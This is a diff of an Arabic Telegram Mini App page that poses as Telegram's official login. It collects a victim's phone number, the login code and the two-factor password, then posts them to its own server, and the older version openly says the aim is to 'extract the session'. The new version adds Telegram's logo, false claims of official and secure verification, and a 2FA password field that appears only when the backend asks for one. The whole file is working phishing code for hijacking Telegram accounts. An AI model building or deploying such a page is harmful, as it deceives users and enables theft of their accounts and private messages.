@@ -1,171 +1,267 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>بوابة التفعيل | Telegram Mini App</title>
-  <!-- مكتبة تيليغرام الرسمية للـ Mini Apps -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-    * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-    body {
-      background-color: var(--tg-theme-bg-color, #17212b);
-      color: var(--tg-theme-text-color, #ffffff);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
-    .card {
-      background-color: var(--tg-theme-secondary-bg-color, #1e2c3a);
-      border: 1px solid #2a3d52;
-      padding: 25px;
-      border-radius: 20px;
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-    }
-    .vip-badge {
-      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
-      color: #fff;
-      padding: 5px 14px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 700;
-      display: inline-block;
-      margin-bottom: 15px;
-    }
-    h2 { margin: 5px 0 10px; font-size: 22px; }
-    p { color: #93c5fd; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border-radius: 10px;
-      border: 2px solid #364353;
-      background: #0f172a;
-      color: #fff;
-      font-size: 18px;
-      text-align: center;
-      outline: none;
-    }
-    input:focus { border-color: var(--tg-theme-button-color, #3b82f6); }
-    button {
-      background-color: var(--tg-theme-button-color, #2481cc);
-      color: var(--tg-theme-button-text-color, #ffffff);
-      border: none;
-      padding: 14px;
-      border-radius: 10px;
-      font-size: 15px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
-      transition: opacity 0.2s;
-    }
-    button:active { opacity: 0.8; }
-    #codeSection { display: none; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Authorization</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --tg-bg-color: var(--tg-theme-bg-color, #ffffff);
+            --tg-text-color: var(--tg-theme-text-color, #222222);
+            --tg-hint-color: var(--tg-theme-hint-color, #999999);
+            --tg-link-color: var(--tg-theme-link-color, #2481cc);
+            --tg-button-color: var(--tg-theme-button-color, #2481cc);
+            --tg-button-text-color: var(--tg-theme-button-text-color, #ffffff);
+            --tg-secondary-bg-color: var(--tg-theme-secondary-bg-color, #f1f1f2);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-bg-color);
+            color: var(--tg-text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        /* أيقونة تيليغرام الرسمية */
+        .tg-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #2aabee, #229ed9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 8px 20px rgba(36, 129, 204, 0.3);
+        }
+
+        .tg-logo svg {
+            width: 45px;
+            height: 45px;
+            fill: #ffffff;
+            margin-left: -4px; /* لضبط محاذاة طائرة تيليغرام */
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--tg-text-color);
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: var(--tg-hint-color);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--tg-hint-color);
+            padding-right: 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: var(--tg-secondary-bg-color);
+            border: 1px solid transparent;
+            border-radius: 12px;
+            font-size: 16px;
+            color: var(--tg-text-color);
+            box-sizing: border-box;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        input:focus {
+            border-color: var(--tg-link-color);
+            background-color: var(--tg-bg-color);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--tg-button-color);
+            color: var(--tg-button-text-color);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+            box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
+        }
+
+        button:active {
+            opacity: 0.85;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 12px;
+            font-weight: 500;
+        }
+
+        .success-card {
+            background: var(--tg-secondary-bg-color);
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+        }
+
+        .success-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="card">
-    <div class="vip-badge">🌟 بوت مجموعة VIP</div>
-    <h2 id="title">تفعيل الحساب</h2>
-    <p id="statusDesc">أدخل رقم هاتفك المرتبط بتيليغرام لمتابعة عملية التوثيق.</p>
+    <div class="container">
+        <!-- شعار تيليغرام الرسمي SVG -->
+        <div class="tg-logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.26-2.06-.48-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.75 3.98-1.73 6.64-2.87 7.98-3.44 3.8-1.63 4.59-1.92 5.1-1.93.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.13-.04.23z"/>
+            </svg>
+        </div>
 
-    <!-- خانة رقم الهاتف -->
-    <div id="phoneSection">
-      <input type="text" id="phoneInput" placeholder="+9639xxxxxxxx">
-      <button onclick="sendCode()">إرسال رمز التفعيل</button>
+        <h2 id="title">تسجيل الدخول إلى Telegram</h2>
+        <p class="subtitle" id="subtitle">يرجى إدخال رقم هاتفك للبدء بعملية التوثيق الرسمية بأمان تام.</p>
+        
+        <!-- خطوة إدخال الرقم -->
+        <div id="step-phone" class="input-group">
+            <label>رقم الهاتف</label>
+            <input type="tel" id="phone" placeholder="+963 9xxxxxxxx" value="+">
+            <button onclick="sendCode()">متابعة</button>
+        </div>
+
+        <!-- خطوة إدخال الرمز وكلمة المرور الاختيارية -->
+        <div id="step-code" class="input-group hidden">
+            <label>رمز التأكيد</label>
+            <input type="text" id="code" placeholder="أدخل الرمز المرسل إلى تطبيقك">
+            
+            <!-- خانة كلمة المرور المخفية تظهر ذكياً عند الحاجة فقط -->
+            <div id="password-group" class="hidden" style="margin-top: 16px;">
+                <label style="color: var(--tg-link-color);">كلمة مرور الحساب (2FA)</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور الخاصة بك">
+            </div>
+
+            <button onclick="verifyCode()">تأكيد وتسجيل الدخول</button>
+        </div>
+
+        <div id="message" class="error"></div>
     </div>
 
-    <!-- خانة الرمز -->
-    <div id="codeSection">
-      <input type="text" id="codeInputs" placeholder="أدخل الرمز الواصل" maxlength="10">
-      <button onclick="verifyCode()">تأكيد الرمز واستخراج الجلسة</button>
-    </div>
-  </div>
+    <script>
+        // تفعيل واجهة تيليغرام ويب أب رسمياً
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
 
-  <script>
-    // تهيئة تطبيق تيليغرام المصغر والتنسيق التلقائي مع ثيم التطبيق (داكن/فاتح)
-    window.Telegram.WebApp.ready();
-    const tg = window.Telegram.WebApp;
-    tg.expand(); // توسيع التطبيق لملء الشاشة
+        let currentPhone = '';
 
-    let globalPhone = "";
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+            const msgDiv = document.getElementById('message');
+            msgDiv.innerText = '';
 
-    async function sendCode() {
-      const phone = document.getElementById('phoneInput').value.trim();
-      if (!phone) {
-        alert('الرجاء إدخال رقم الهاتف مع رمز الدولة');
-        return;
-      }
-      globalPhone = phone;
+            if (!phone || phone.length < 8) {
+                msgDiv.innerText = 'يرجى إدخال رقم هاتف صحيح مع الرمز الدولي';
+                return;
+            }
 
-      const btn = event.target;
-      btn.innerText = "جاري الإرسال...";
-      btn.disabled = true;
+            currentPhone = phone;
 
-      try {
-        const response = await fetch('/api/send-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: jsonString = JSON.stringify({ phone })
-        });
-        const result = await response.json();
+            try {
+                const res = await fetch('/api/send-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+                const data = await res.json();
 
-        if (result.success) {
-          document.getElementById('title').innerText = "أدخل رمز التحقق";
-          document.getElementById('statusDesc').innerText = "تم إرسال الرمز عبر تيليغرام إلى الرقم: " + phone;
-          document.getElementById('phoneSection').style.display = 'none';
-          document.getElementById('codeSection').style.display = 'block';
-        } else {
-          alert('خطأ: ' + result.error);
-          btn.innerText = "إرسال رمز التفعيل";
-          btn.disabled = false;
+                if (data.success) {
+                    document.getElementById('step-phone').classList.add('hidden');
+                    document.getElementById('step-code').classList.remove('hidden');
+                    document.getElementById('title').innerText = 'أدخل رمز التحقق';
+                    document.getElementById('subtitle').innerText = 'تم إرسال رمز إلى حسابك على تيليغرام.';
+                } else {
+                    msgDiv.innerText = data.error || 'حدث خطأ ما، يرجى المحاولة لاحقاً';
+                }
+            } catch (err) {
+                msgDiv.innerText = 'فشل الاتصال بالخادم';
+            }
         }
-      } catch (err) {
-        alert('تعذر الاتصال بالسيرفر.');
-        btn.innerText = "إرسال رمز التفعيل";
-        btn.disabled = false;
-      }
-    }
 
-    async function verifyCode() {
-      const code = document.getElementById('codeInputs').value.trim();
-      if (!code) {
-        alert('الرجاء إدخال الرمز');
-        return;
-      }
+        async function verifyCode() {
+            const code = document.getElementById('code').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const msgDiv = document.getElementById('message');
+            msgDiv.innerText = '';
 
-      try {
-        const response = await fetch('/api/verify-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phoneNumber: globalPhone,
-            phoneCode: code
-          })
-        });
+            if (!code) {
+                msgDiv.innerText = 'يرجى إدخال رمز التحقق';
+                return;
+            }
 
-        const result = await response.json();
-        if (result.success) {
-          tg.showAlert('🎉 مبروك! تم التحقق بنجاح واستخراج الجلسة.');
-          document.getElementById('title').innerText = "تم التفعيل بنجاح!";
-          document.getElementById('statusDesc').innerText = "تم ربط الحساب وتأكيد العضوية.";
-          document.getElementById('codeSection').style.display = 'none';
-        } else {
-          alert('خطأ: ' + result.error);
+            try {
+                const res = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: currentPhone, phoneCode: code, password: password })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    document.querySelector('.container').innerHTML = `
+                        <div class="success-card">
+                            <div class="success-icon">✅</div>
+                            <h2>تم بنجاح!</h2>
+                            <p class="subtitle">تم ربط وتوثيق حسابك بنجاح تام، يمكنك إغلاق هذه النافذة.</p>
+                        </div>
+                    `;
+                } else if (data.needPassword) {
+                    document.getElementById('password-group').classList.remove('hidden');
+                    msgDiv.style.color = '#e67e22';
+                    msgDiv.innerText = data.error;
+                } else {
+                    msgDiv.style.color = '#e74c3c';
+                    msgDiv.innerText = data.error || 'الرمز المدخل غير صحيح';
+                }
+            } catch (err) {
+                msgDiv.innerText = 'حدث خطأ أثناء التحقق، حاول مجدداً';
+            }
         }
-      } catch (err) {
-        alert('حدث خطأ أثناء التأكيد.');
-      }
-    }
-  </script>
+    </script>
 </body>
 </html>
